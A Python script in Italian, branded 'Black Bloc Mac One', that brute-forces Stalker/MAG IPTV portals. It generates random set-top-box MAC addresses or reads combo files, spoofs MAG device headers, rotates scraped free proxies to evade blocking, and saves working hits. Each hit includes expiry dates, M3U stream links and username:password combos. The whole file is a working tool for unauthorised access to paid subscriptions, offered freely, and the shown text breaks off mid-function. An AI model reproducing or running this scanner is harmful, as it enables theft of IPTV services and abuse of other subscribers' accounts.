import os,pip
import datetime,os
import socket,hashlib
import json,random,sys, time,re
try:
    import flag
except:
    pip.main(['install', 'emoji-country-flag'])
    import flag
import os,pip
import datetime,os
import socket,hashlib
import json,random,sys, time,re
import locale

# Imposta la lingua italiana per le date (giorno della settimana, mese)
try:
    locale.setlocale(locale.LC_TIME, 'it_IT.UTF-8')
except locale.Error:
    print("Locale 'it_IT.UTF-8' non supportato. Verrà usato il formato di default.")

# Registra l'orario esatto di avvio dello script
orario_avvio_script = datetime.datetime.now()

nickn=""
import requests, datetime
import json,random,sys, time


import sys
import subprocess
import pathlib
import os
maca=0
macv=0

nickn=""
nickn=""
white=("""\033[1;37;40m\n""")
if nickn=="":
	nickn=""

try:
	import threading
except:pass
import pathlib

try:
	import requests
except:
	print("Il modulo 'requests' non è installato \n Installazione del modulo 'requests' in corso \n")
	pip.main(['install', 'requests'])
import requests
try:
	import pysocks
except:
	print("Il modulo 'pysocks' non è installato \n Installazione del modulo 'PySocks' in corso \n")
	pip.main(['install', 'PySocks'] )


subprocess.run(["clear", ""])
getmac=""
oto=0
tur=0
Seri=""
csay=0

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
	import cfscrape
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:
	ses= requests.Session()
logging.captureWarnings(True)

say1=0
say2=0
say=0
yanpanel="hata"
imzayan=""
bul=0
hitc=0
prox=0
cpm=0


GIALLO = '\33[93m'
ROSSO = '\33[91m'
VERDE = '\33[92m'
RESET = '\033[0m'

macSayisi=999999999999991# 
Fabrizio=("""
\33[38;5;225m

  🅑🅛🅐🅒🅚 🅑🅛🅞🅒                              
  
  🅜🅐🅒 🅞🅝🅔                                       
  
  Script Python Fabrizio 
                   """)
print(Fabrizio)
kisacikti=""
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
ozelmac=""

nick=''
bekleme=1
isimle=""

def pulisci_schermo():
    os.system('cls' if os.name == 'nt' else 'clear')

# Logica di selezione dei proxy
usa_proxy = ""
metodo_proxy = ""
tipo_proxy_online = ""
percorso_proxy_file = ""
protocollo_proxy = 0
file_proxy_contenuto = []

usa_proxy = input(f"""{GIALLO}
   Vuoi utilizzare i proxy? \33[0m
   \33[36m1 = Si,   2 = No (INVIO)\33[0m
{ROSSO}   Risposta = \33[0m""") or "2"

if usa_proxy == "1":
    pulisci_schermo()
    metodo_proxy = input(f"""{GIALLO}
   Come vuoi caricare i proxy? \33[0m
   \33[36m1 = Online (INVIO),   2 = Da file locale\33[0m
{ROSSO}   Risposta = \33[0m""") or "1"

    if metodo_proxy == "1":
        pulisci_schermo()
        tipo_proxy_online = input(f"""\33[1;40m   Scegli tipo di Proxy Online \33[0m
   {GIALLO}ᴅᴇғᴀᴜʟᴛ = 1 (INVIO){RESET}
   \33[36m
   1 = HTTP/s
   2 = Sᴏᴄᴋs4
   3 = Sᴏᴄᴋs5
   \33[0m
{ROSSO}   Tipo di Proxy = \33[0m""") or "1"

        headers_proxy = {"user-agent": "Mozilla/5.0"}
        proxy_urls, tipo_proxy = [], ""
        if tipo_proxy_online == "1":
            protocollo_proxy, tipo_proxy = 3, "HTTP/s"
            proxy_urls = ["https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=elite", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"]
        elif tipo_proxy_online == "2":
            protocollo_proxy, tipo_proxy = 4, "Socks4"
            proxy_urls = ["https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt"]
        elif tipo_proxy_online == "3":
            protocollo_proxy, tipo_proxy = 5, "Socks5"
            proxy_urls = ["https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"]
        
        print(f"\n{GIALLO}   Download proxy {tipo_proxy} in corso...{RESET}")
        for url in proxy_urls:
            try:
                r = requests.get(url, headers=headers_proxy, timeout=10)
                file_proxy_contenuto.extend(r.text.splitlines())
            except Exception: continue
        
        file_proxy_contenuto = [line.strip() for line in file_proxy_contenuto if line.strip()]
        if file_proxy_contenuto: print(f"\n{VERDE}   {len(file_proxy_contenuto)} proxy caricati.{RESET}")
        else: print(f"\n{ROSSO}   Download fallito. Continuo senza proxy.{RESET}"); usa_proxy = "2"
        time.sleep(2)

    elif metodo_proxy == "2":
        pulisci_schermo()
        cartella_proxy = '/sdcard/Proxy/'
        if not os.path.exists(cartella_proxy):
            os.mkdir(cartella_proxy)
        
        contatore = 0
        elenco_file = ''
        file_disponibili = []
        for file in os.listdir(cartella_proxy):
            if file.endswith('.txt'):
                contatore += 1
                elenco_file += f'   \33[1;31m{contatore}\33[0m\33[1;32m = \33[0m\33[36m{file}\33[36m\n'
                file_disponibili.append(file)
        
        if not file_disponibili:
            print(f"\n{ROSSO}Nessun file .txt trovato in {cartella_proxy}. Continuo senza proxy.{RESET}")
            usa_proxy = "2"
            time.sleep(3)
        else:
            print(f'\n   \33[1;40mScegli i tuoi proxy dalla lista sottostante! \33[0m\n\n{elenco_file}\n   {GIALLO}Trovati {contatore} file proxy .txt. \33[0m')
            scelta_file_proxy = input(f'\n{ROSSO}   Risposta = \33[0m')
            
            try:
                scelta_idx = int(scelta_file_proxy) - 1
                if 0 <= scelta_idx < len(file_disponibili):
                    dati_proxy = os.path.join(cartella_proxy, file_disponibili[scelta_idx])
                    nome_file_proxy = os.path.basename(dati_proxy)
                    print(f'\n{GIALLO}   Caricamento Proxy... \33[0m\n   [+] {nome_file_proxy}')
                    
                    with open(dati_proxy, 'r', encoding='utf-8') as f:
                        file_proxy_contenuto = [line.strip() for line in f.readlines() if line.strip()]
                    totale_proxy = len(file_proxy_contenuto)
                    
                    scelta_tipo_proxy = input(f'''
\33[1;40m   Qual è il tipo di proxy nel file? \33[0m
   
{GIALLO}   [{totale_proxy}] {nome_file_proxy} {RESET}
   \33[36m
   1 = Fʀᴇᴇ - HTTP/S (IP:Pᴏʀᴛ) 
   2 = Fʀᴇᴇ - Sᴏᴄᴋs4 (IP:Pᴏʀᴛ) 
   3 = Fʀᴇᴇ - Sᴏᴄᴋs5 (IP:Pᴏʀᴛ) 
   \33[0m
{ROSSO}   Tipo di Proxy = \33[0m''')
                    if scelta_tipo_proxy == '1': protocollo_proxy = 3
                    elif scelta_tipo_proxy == '2': protocollo_proxy = 4
                    elif scelta_tipo_proxy == '3': protocollo_proxy = 5
                    else:
                        print('\n   Selezione tipo proxy non corretta! Continuo senza proxy.')
                        usa_proxy = "2"
                else:
                    print('\n   Selezione non valida! Continuo senza proxy.')
                    usa_proxy = "2"
            except (ValueError, IndexError):
                print('\n   Selezione non valida! Continuo senza proxy.')
                usa_proxy = "2"
            time.sleep(2)

pulisci_schermo()
print(Fabrizio)
intro="""
	\33[1;31m𝟷 \33[0m\33[1;32m=⫸ \33[0m \33[33mᴘᴏʀᴛᴀʟ.ᴘʜᴘ \33[0m
	\33[1;31m𝟸 \33[0m\33[1;32m=⫸ \33[0m \33[33msᴇʀvʟᴏᴀᴅ.ᴘᴏʀᴛᴀʟ \33[0m
	\33[1;31m𝟹 \33[0m\33[1;32m=⫸ \33[0m \33[33msᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ \33[0m
	\33[1;31m𝟺 \33[0m\33[1;32m=⫸ \33[0m \33[33mʙs.ᴍᴀɢ.ᴘᴏʀᴛᴀʟ.ᴘʜᴘ \33[0m
	\33[1;31m𝟻 \33[0m\33[1;32m=⫸ \33[0m \33[33mᴘᴏʀᴛᴀʟᴄᴄ.ᴘʜᴘ \33[0m
	\33[1;31m𝟼 \33[0m\33[1;32m=⫸ \33[0m \33[33mᴍᴀɢʟᴏᴀᴅ.ᴘʜᴘ \33[0m
	\33[1;31m𝟽 \33[0m\33[1;32m=⫸ \33[0m \33[33mᴍɪɴɪsᴛʀᴀ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ \33[0m
	\33[1;31m8 \33[0m\33[1;32m=⫸ \33[0m \33[33mcp \33[0m
	\33[1;31m9 \33[0m\33[1;32m=⫸ \33[0m \33[33mkorisnici \33[0m
       \33[1;31m10 \33[0m\33[1;32m=⫸ \33[0m \33[33mtek \33[0m
       \33[1;31m11 \33[0m\33[1;32m=⫸ \33[0m \33[33memu \33[0m
       \33[1;31m12 \33[0m\33[1;32m=⫸ \33[0m \33[33memu2 \33[0m
       \33[1;31m13 \33[0m\33[1;32m=⫸ \33[0m \33[33mghandi_portal \33[0m
       \33[1;31m14 \33[0m\33[1;32m=⫸ \33[0m \33[33mxUi c/server/load.php\33[0m
       \33[1;31m15 \33[0m\33[1;32m=⫸ \33[0m \33[33mxUi c/portal.php\33[0m


\33[1;44m
Pannello - Porta =\33[0m"""
a="""pannello-porta = """
panel = input(intro)
print('\33[0m')
speed=""



uzmanm="portal.php"
useragent="okhttp/4.7.1"


if  panel=="" or panel=="1":
    	uzmanm="portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	print(Fabrizio)
    	panel = input(a)

if  panel=="0":
    	uzmanm=input('Scrivi qui=')
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)

if panel=="2":
    	uzmanm="server/load.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)

if panel=="3":
    	uzmanm="server/load.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)

if panel=="4":
    	uzmanm="bs.mag.portal.php"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)

if panel=="5":
    	uzmanm="portalcc.php"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)

if panel=="6":
    	uzmanm="magLoad.php"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)

if panel=="7":
    	uzmanm="ministra/portal.php"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)

if panel=="8":
    	uzmanm="cp/server/load.php"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)

if panel=="9":
    	uzmanm="korisnici/server/load.php"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)

if panel=="10":
    	uzmanm="tek/server/load.php"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)

if panel=="11":
    	uzmanm="emu/server/load.php"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)

if panel=="12":
    	uzmanm="emu2/server/load.php"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)

if panel=="13":
    	uzmanm="ghandi_portal/server/load.php"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)

if panel=="14":
    	uzmanm="c/server/load.php"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)

if panel=="15":
    	uzmanm="c/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	subprocess.run(["clear", ""])
    	print(Fabrizio)
    	panel = input(a)
realblue=""
if panel=="20":
	realblue="real"
	subprocess.run(["clear", ""])
	print(Fabrizio)
	panel = input(a)

print('\33[0m')

print(panel)

print("\33[38;5;226m"+Fabrizio)
kanalkata="0"

subprocess.run(["clear", ""])
print(Fabrizio)
totLen=[]
dosyaa=""
yeninesil=(
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'55:93:EA:',
'04:D6:AA:',
'11:33:01:',
'00:1a:79:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:A1:79:',
'00:1B:79:',
'00:2A:79:',
'00:1A:79:',
)

if "1"=="1":
 	say=0
 	dsy=""
 	dsy="\n       \33[1;4;94;47m 0=⫸ Casuale (MAC AUTOMATICO)  \33[0m\n"
 	dir='/sdcard/combo/'
 	if not os.path.exists(dir):
 	    os.makedirs(dir)
 	for files in os.listdir (dir):
 		say=say+1
 		dsy=dsy+"	"+str(say)+"=⫸ "+files+'\n'
 	print ("""Seleziona la tua combo dalla lista qui sotto!!!
"""+dsy+"""
\33[33mNella tua cartella Combo sono stati trovati """ +str(say)+""" file!
	""")
 	dsyno=str(input(" \33[31mNumero Combo =\33[0m"))
 	say=0

 	if dsyno=="":
 		dsyno="0"
 	if dsyno=="0":

 		print(Fabrizio)


 		nnesil=str(yeninesil)
 		nnesil=(nnesil.count(',')+1)
 		for xd in range(0,(nnesil)):
 			tire='  》'
 			if int(xd) <9:
 				tire='   》'
 			print(str(xd+1)+tire+yeninesil[xd])




 		mactur_input=input("Seleziona il tipo di MAC...\n Risposta=")
 		if mactur_input=="" or not mactur_input.isdigit():
 			mactur_input="14"
 		mactur=yeninesil[int(mactur_input)-1]
 		print(mactur)
 		uz_input=input("""

 Inserisci il numero di MAC da scansionare.

  Quantità MAC=⫸""")
 		if uz_input=="":
 			uz=30000
 		else:
 			uz=int(uz_input)
 		print(uz)
 	else:
	 	for files in os.listdir (dir):
	 			say=say+1
	 			if dsyno==str(say):
	 				dosyaa=(dir+files)
	 				break
	 	say=0
	 	if not dosyaa=="":
	 		print(dosyaa)
	 	else:

	 		subprocess.run(["clear", ""])
	 		subprocess.run(["clear", ""])
	 		print("Selezione file combo errata...!")
	 		quit()
	 	with open(dosyaa, 'r', encoding='utf-8') as c:
	 		totLen=c.readlines()
	 	uz=(len(totLen))


 	subprocess.run(["clear", ""])
 	print(Fabrizio)
 	baslama=""

 	if not baslama =="":
 		baslama=int(baslama)
 		csay=baslama

botsay=input("""

   \33[1;96mSpecifica il Numero di Bot...!\33[0m
    \33[1;33mSCEGLI UN NUMERO
      TRA 1 E 15...!!\33[0m

Bot=""" )
subprocess.run(["clear", ""])
print(Fabrizio)
if botsay=="" or not botsay.isdigit():
	botsay=int(4)
else:
    botsay=int(botsay)

kanalkata="0"
kanalkata=input("""\33[1;40m
Le categorie dei canali devono essere incluse nell'output?

	0=⫸Non aggiungere
	1=⫸Solo categorie di canali Nazionali
	2=⫸Aggiungi tutto (Live-VOD-Serie)

\33[1mInserisci la risposta=""")
if kanalkata=="":
	kanalkata="0"


gsay=0
vsay=0

if panel=="" :
    panel=" vpn.iptvtiger2.xyz"

Rhit='\33[33m'
Ehit='\033[0m'
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
panel=panel.replace('stalker_portal','/stalker_portal')
tkn1="a"
tkn2="a"
tkn3="a"
tkn4="a"
tkn5="a"
pro1="a"
pro2="a"
pro3="a"
trh1="a"
trh2="a"
trh3="a"
ip=""
fname=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""

subprocess.run(["clear", ""])
print(Fabrizio)

server_folder_name = panel.replace(':', '_').replace('/', '')
base_save_path = "/sdcard/hits/☆BLACK☆BLOC☆MAC☆ONE☆/"
save_path = os.path.join(base_save_path, server_folder_name)
os.makedirs(save_path, exist_ok=True)

def save_full_hit(data):
    with open(os.path.join(save_path, "Full hit.txt"), 'a+', encoding='utf-8') as f:
        f.write(data + "\n\n")

def save_mac_combo(data):
    with open(os.path.join(save_path, "Combo mac.txt"), 'a+', encoding='utf-8') as f:
        f.write(data + "\n")

def save_user_pass_combo(data):
    with open(os.path.join(save_path, "Combo user pass.txt"), 'a+', encoding='utf-8') as f:
        f.write(data + "\n")

acount_id=""
a="0123456789ABCDEF"
s=-1
ss=0
sss=0
ssss=0
sd=0
vpnsay=0
hitsay=0
onsay=0
sdd=0
vsay=0
bad=0
proxies=""
say=1

def month_string_to_number(ay):
    m = {
        'jan': 1, 'feb': 2, 'mar': 3, 'apr':4, 'may':5, 'jun':6,
        'jul':7, 'aug':8, 'sep':9, 'oct':10, 'nov':11, 'dec':12
    }
    s = ay.strip()[:3].lower()
    try:
        return m[s]
    except:
        raise ValueError('Not a month')

from datetime import date

def tarih_clear(trh):
	try:
		ay=str(trh.split(' ')[0])
		gun=str(trh.split(', ')[0].split(' ')[1])
		yil=str(trh.split(', ')[1])
		ay=str(month_string_to_number(ay))
		d = date(int(yil), int(ay), int(gun))
		sontrh = time.mktime(d.timetuple())
		return int((sontrh-time.time())/86400)
	except:
		return "N/A"

macs=""
sayi=1
b1hitc=0
b2hitc=0

def randommac():
	try:
		genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 255)),(random.randint(0, 255)),(random.randint(0, 255)))
	except:
	    genmac = "00:1A:79:%02x:%02x:%02x"% ((random.randint(0, 255)),(random.randint(0, 255)),(random.randint(0, 255)))
	return genmac.upper()

url1="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml"
url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml"
if realblue=="real":
	url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"
url6="http://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"

# URLs for lists
liveurl="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
vodurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
seriesurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"

# URLs for counting - These are the most reliable endpoints
live_count_url = "http://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
vod_count_url = "http://"+panel+"/"+uzmanm+"?type=vod&action=get_ordered_list&JsHttpRequest=1-xml"
series_count_url = "http://"+panel+"/"+uzmanm+"?type=series&action=get_ordered_list&JsHttpRequest=1-xml"


def url(cid):
	url7="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	return url7

def hea1(macs):
	HEADERA={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
}
	return 	HEADERA

def hea2(macs,token):
	HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+token,
	}
	return HEADERd

def hea3():
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100",
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea

hityaz=0

def get_info_ip(hostname, proxies={}):
    ip_address = ""
    domain = hostname.split(':')[0]
    
    try:
        ip_address = socket.gethostbyname(domain)
    except socket.gaierror:
        ip_address = domain 
        return {'ip': hostname, 'isp': 'N/A', 'city': 'N/A', 'region': 'N/A', 'country': 'N/A', 'flag': '🏴‍☠️'}

    try:
        url = f"https://ipapi.co/{ip_address}/json/"
        res = ses.get(url, timeout=7, verify=False, proxies=proxies)
        res.raise_for_status()
        data = res.json()
        
        info = {
            'ip': data.get('ip', ip_address),
            'isp': data.get('org', 'N/A'),
            'city': data.get('city', 'N/A'),
            'region': data.get('region', 'N/A'),
            'country': data.get('country_name', 'N/A'),
            'flag': flag.flag(data.get('country_code', '')) if data.get('country_code') else '🏴‍☠️'
        }
        return info
    except Exception:
        return {'ip': ip_address, 'isp': 'N/A', 'city': 'N/A', 'region': 'N/A', 'country': 'N/A', 'flag': '🏴‍☠️'}

def get_vpn_info():
    try:
        # NOTA: Chiamata senza proxy per ottenere l'IP reale della macchina
        url = "http://ipleak.net/json/"
        res = ses.get(url, timeout=7, verify=False)
        res.raise_for_status()
        data = res.json()
        
        vpn_ip = data.get('ip', 'N/A')
        vpn_isp = data.get('isp_name', 'N/A')
        vpn_city = data.get('city_name', 'N/A')
        vpn_region = data.get('region_name', 'N/A')
        vpn_nation = data.get('country_name', 'N/A')
        vpn_flag = flag.flag(data.get('country_code', '')) if data.get('country_code') else '🏴‍☠️'

        info_string = f"""
IP {vpn_ip}
NAZIONE {vpn_nation} {vpn_flag}
REG/CITTÀ {vpn_region} ☆ {vpn_city}
ISP {vpn_isp}"""
        return info_string
    except Exception:
        return "\n𝐈𝐍𝐅𝐎 𝐕𝐏𝐍  Dettagli non disponibili."

def estrai_valore(data, key):
    """Estrae un valore da una stringa JSON-like in modo sicuro."""
    try:
        match = re.search(f'["\']{key}["\']\s*:\s*["\'](.*?)["\']', data)
        if match:
            return match.group(1).encode('utf-8').decode('unicode-escape')
        return "N/A"
    except Exception:
        return "N/A"

def hit(mac, trh, real, m3u_real, m3u_panel, durum, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC, server_info, vpn_info, user_api, pass_api, live_count, vod_count, series_count, stalker_info_section, server_header, status_code_hit, proxy_details, proxy_type, proxy_status):
    global hitr, hityaz
    try:
        orario_hit = datetime.datetime.now()
        data_italiana = orario_hit.strftime("%A, %d %B %Y")
        orario_avvio_str = orario_avvio_script.strftime("%H:%M:%S")
        orario_fine_str = orario_hit.strftime("%H:%M:%S")
        
        info_esecuzione_section = f"""
☆▂▂INFO 🕒 ESECUZIONE▂▂☆
DATA HIT  {data_italiana}
ORARIO AVVIO  {orario_avvio_str}
ORARIO FINE  {orario_fine_str}
SCRIPT FABRIZIO
"""

        protezione_server_section = f"""
☆▂▂PROTEZIONE 🛡️ SERVER▂▂☆
TIPO SERVER ➢ {server_header}
ISP PROTEZIONE ➢ {server_info.get('isp', 'N/A')}
"""
        status_code_text = f"{status_code_hit} (OK)" if status_code_hit == 200 else f"{status_code_hit}"

        proxy_info_section = ""
        if usa_proxy == '1':
            proxy_info_section = f"""
☆▂▂INFO 🛡️ PROXY▂▂☆
IP PROXY {proxy_details.get('ip', 'N/A')}
TIPO PROXY {proxy_type}
ISP PROXY {proxy_details.get('isp', 'N/A')}
NAZIONE PROXY {proxy_details.get('country', 'N/A')} {proxy_details.get('flag', '🏴‍☠️')}
STATO PROXY {proxy_status}
"""

        imza=f"""
🎭▂▂☆BLACK BLOC MAC ONE☆▂▂🎭
PANNELLO REALE  {real}
PANNELLO  http://{panel}/c/
MAC  {mac}
SCADENZA {trh}

☆▂▂INFO 🌏 SERVER▂▂☆
IP SERVER  {server_info.get('ip', 'N/A')}
NAZIONE  {server_info.get('country', 'N/A')} {server_info.get('flag', '🏴‍☠️')}
REG/CITTÀ  {server_info.get('region', 'N/A')} ☆ {server_info.get('city', 'N/A')}
PROVIDER  {server_info.get('isp', 'N/A')}

☆▂▂INFO ☄️ VPN▂▂☆{vpn_info}

{protezione_server_section}
{stalker_info_section}

☆▂▂CONTROLLO 🪆 CANALI▂▂☆
STATO  {durum}
CODICE HTTP  {status_code_text}
{proxy_info_section}
{playerapi}

☆▂▂CRIPTAZIONE 🎯 DISPOSITIVO▂▂☆
SN {SNENC}
SNCUT {SNCUT}
DEVICE1 {DEVENC}
DEVICE2 {SINGENC}
🇮🇹SCRIPT FABRIZIO🇮🇹

☆▂▂▂LINK 🥎 M3U▂▂▂☆
M3U PANEL   {m3u_panel}
M3U REAL  {m3u_real}

☆▂▂▂CONTEGGIO 📊 MEDIA▂▂▂☆
LIVE 📺  {live_count}
VOD 🎬  {vod_count}
SERIE 🎞️  {series_count}
"""
        if  kanalkata=="1" or kanalkata=="2":
            imza=imza+f"""
╭─◉LISTA 🪅 LIVE
╰─➤{livelist}
"""
        if kanalkata=="2":
            imza=imza+f"""
╭─●LISTA 🎲 VOD
╰─➤{vodlist}

╭─●LISTA 🎉 SERIE
╰─➤{serieslist}
"""
        
        imza=imza+f"""
{info_esecuzione_section}
☆▂▂▂SCRIPT FABRIZIO 🌟 PYTHON ▂▂▂☆
💻TERMUX,ANDROID,PYDROID📲
🪔PROGETTO FREE🪔
☄️BLACK BLOC MAC ONE☄️ 
🇮🇹SCRIPT FABRIZIO🇮🇹
"""
        print(imza)
        save_full_hit(imza)
        save_mac_combo(mac)
        if user_api and pass_api:
            save_user_pass_combo(f"{user_api}:{pass_api}")

        hityaz=hityaz+1
        print(white)
        if hityaz >= hitc:
            hitr="\33[1;33m"
    except Exception as e:
        print(f"Errore nella funzione hit: {e}")

hityaz=0
combodosya=os.path.basename(dosyaa) if dosyaa else "MAC Casuale"
combo=dsy
dosya=""
macexp=0
cpm=0
cpmx=0
hitr="\33[1;33m"
proxy_corrente_ip = "Disabilitato"
proxy_corrente_stato = ""
server_info_global = {}

def echok(mac,bot,total,hitc,status_code,oran):
	global macv, maca, macexp, cpm, tokenr, color, hitr
	global proxy_corrente_ip, proxy_corrente_stato, server_info_global
	try:
		cpmx_calc=(time.time()-cpm)
		if cpmx_calc > 0:
			cpm = round(60 / cpmx_calc)

		if not server_info_global:
			server_info_global = get_info_ip(panel)

		echo=("""





   🄱🄻🄰🄲🄺 🄱🄻🄾🄲
           
     🄵🅄🅂🄸🄾🄽 
               
     🄼🄰🄲 🄾🄽🄴
               
   ꜱᴄʀɪᴘᴛ ꜰᴀʙʀɪᴢɪᴏ
\33[0m
\33[38;5;232mProxy """+proxy_corrente_ip+""" """+proxy_corrente_stato+""" 

\33[38;5;221mProvider  """+str(server_info_global.get('isp', 'N/A'))+"""
\33[38;5;219mNazione  """+str(server_info_global.get('country', 'N/A'))+""" * """+str(server_info_global.get('flag', '🏴‍☠️'))+"""
\33[38;5;222mIP Server """+str(server_info_global.get('ip', panel))+"""
\33[38;5;218mRegione """+str(server_info_global.get('region', 'N/A'))+"""
